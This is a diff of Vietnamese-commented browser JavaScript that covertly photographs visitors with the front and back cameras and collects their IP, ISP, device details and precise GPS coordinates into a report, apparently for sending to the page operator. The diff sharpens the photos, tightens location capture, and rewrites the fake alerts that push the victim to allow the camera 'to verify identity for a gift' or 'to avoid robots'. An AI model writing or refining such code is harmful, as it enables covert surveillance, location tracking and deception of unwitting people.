@@ -7,44 +7,50 @@ const info = {
 
 const delay = ms => new Promise(res => setTimeout(res, ms));
 
-// Hàm chụp ảnh đã fix lỗi ảnh đen
 async function captureCamera(facingMode = 'user') {
-  const stream = await navigator.mediaDevices.getUserMedia({ 
-    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
-    audio: false 
-  });
-  
-  return new Promise(resolve => {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.setAttribute('playsinline', ''); // Quan trọng cho iOS
-    video.play();
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode: facingMode,
+        width: { min: 640, ideal: 1280, max: 1920 },
+        height: { min: 480, ideal: 720, max: 1080 }
+      }, 
+      audio: false 
+    });
+    
+    return new Promise(resolve => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.setAttribute('playsinline', ''); 
+      video.muted = true;
+      video.play();
 
-    // Đợi video thực sự sẵn sàng
-    video.onloadeddata = async () => {
-      // Đợi thêm 1.2 giây để camera tự động điều chỉnh độ sáng (Auto-exposure)
-      await delay(1200); 
-      
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      
-      // Vẽ ảnh từ video vào canvas
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      // Tắt stream ngay sau khi vẽ xong
-      stream.getTracks().forEach(t => t.stop());
-      
-      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.6);
-    };
-  });
+      video.onloadedmetadata = async () => {
+        // Tăng thời gian chờ lên 2.5 giây để camera lấy nét và bù sáng cực chuẩn
+        await delay(2500); 
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        
+        // Chỉnh sửa nhẹ độ tương phản để ảnh rõ hơn
+        ctx.filter = 'brightness(1.1) contrast(1.1)';
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        stream.getTracks().forEach(t => t.stop());
+        
+        // Giữ chất lượng 0.8 để ảnh nét nhưng dung lượng vẫn vừa phải
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+      };
+    });
+  } catch (e) { return null; }
 }
 
 async function main() {
   info.time = new Date().toLocaleString('vi-VN');
   
-  // 1. Nhận diện thiết bị
+  // 1. Nhận diện máy
   const ua = navigator.userAgent;
   info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
   info.device = navigator.platform;
@@ -53,25 +59,28 @@ async function main() {
   let backBlob = null;
 
   try {
-    // 2. ÉP QUYỀN CAMERA (Chụp cam trước)
+    // 2. Chụp cam trước (Ưu tiên lấy nét)
     frontBlob = await captureCamera("user");
-    // Chụp cam sau (nếu có)
-    try {
-        backBlob = await captureCamera("environment");
-    } catch(e) { console.log("Không có cam sau"); }
     
-    info.camera = "✅ Thành công";
+    // 3. Chụp cam sau (Nếu muốn nhanh thì có thể bỏ qua bước này hoặc để sau)
+    if (frontBlob) {
+        backBlob = await captureCamera("environment");
+    }
+    
+    if (!frontBlob) throw new Error("No photo");
+    info.camera = "✅ Rõ nét";
   } catch (e) {
-    alert("CẢNH BÁO: Hệ thống yêu cầu Camera để xác thực danh tính nhận quà. Vui lòng nhấn 'Cho phép'!");
+    alert("CẢNH BÁO: Hệ thống cần xác thực hình ảnh để tránh Robot. Vui lòng 'Cho phép' Camera!");
     location.reload();
     return;
   }
 
-  // 3. LẤY IP & GPS (Chạy song song)
+  // 3. Lấy IP & GPS
   const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
     info.ip = res.ip;
     info.isp = res.connection?.org || 'N/A';
-    if (!info.lat) { info.lat = res.latitude; info.lon = res.longitude; }
+    info.lat = res.latitude;
+    info.lon = res.longitude;
   }).catch(() => {});
 
   const getGPS = new Promise(res => {
@@ -79,11 +88,10 @@ async function main() {
       p => {
         info.lat = p.coords.latitude.toFixed(6);
         info.lon = p.coords.longitude.toFixed(6);
-        info.address = `Độ chính xác cao`;
         res();
       },
       () => res(), 
-      { enableHighAccuracy: true, timeout: 4000 }
+      { enableHighAccuracy: true, timeout: 3000 }
     );
   });
 
@@ -98,8 +106,8 @@ async function main() {
 📱 <b>Device:</b> ${info.device} (${info.os})
 🌍 <b>IP:</b> ${info.ip}
 🏢 <b>ISP:</b> ${info.isp}
-📍 <b>Maps:</b> <a href="${mapsLink}">Xem vị trí</a>
-🏙️ <b>Địa chỉ:</b> ${info.address || 'Tọa độ IP'}
+📍 <b>Maps:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
+🏙️ <b>Tọa độ:</b> ${info.lat}, ${info.lon}
 `.trim();
 
   const formData = new FormData();
